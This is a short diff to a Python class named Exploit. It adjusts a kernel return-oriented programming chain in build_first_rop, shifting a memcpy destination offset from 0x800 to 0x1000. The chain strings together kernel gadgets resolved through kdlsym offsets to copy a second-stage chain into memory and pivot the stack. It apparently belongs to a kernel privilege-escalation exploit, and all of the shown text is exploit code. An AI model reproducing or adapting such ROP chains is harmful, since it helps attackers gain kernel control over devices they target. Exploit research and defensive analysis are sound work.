@@ -476,14 +476,14 @@ class Exploit():
     def build_first_rop(self, fake_lle, rop2):
         rop = bytearray()
 
-        # memcpy(RBX - 0x800, rop2, len(rop2 + stage1))
+        # memcpy(RBX - 0x1000, rop2, len(rop2 + stage1))
 
-        # RDI = RBX - 0x800
+        # RDI = RBX - 0x1000
         rop += p64(self.kdlsym(self.offs.POP_R12_RET))
         rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
         rop += p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12))
         rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(-0x800)
+        rop += p64(-0x1000)
         rop += p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET))
 
         # RSI += len(fake_lle + rop)
@@ -505,7 +505,7 @@ class Exploit():
         rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
         rop += p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX))
         rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(0x800 + 0x20)
+        rop += p64(0x1000 + 0x20)
         rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
         rop += p64(0xDEADBEEF)
         rop += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))
